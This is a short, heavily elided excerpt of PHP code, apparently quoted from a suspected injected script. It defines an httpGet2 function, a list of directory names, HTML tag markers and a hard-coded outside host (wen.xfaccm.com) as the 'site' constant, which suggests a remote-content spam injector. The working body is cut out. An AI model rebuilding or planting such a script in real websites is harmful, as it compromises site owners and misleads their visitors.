...
if (!function_exists('httpGet2')) {
    function httpGet2($url) {
        ...
        $dirs = array("dy", "ys", "ku", "du", "zkblw", "keyan", "zhuli", "moban", "wen", "template", "html1");
        $tags = array('<body>', '</body>', '<html>', '</html>');
...
define('site', "http://wen.xfaccm.com/");
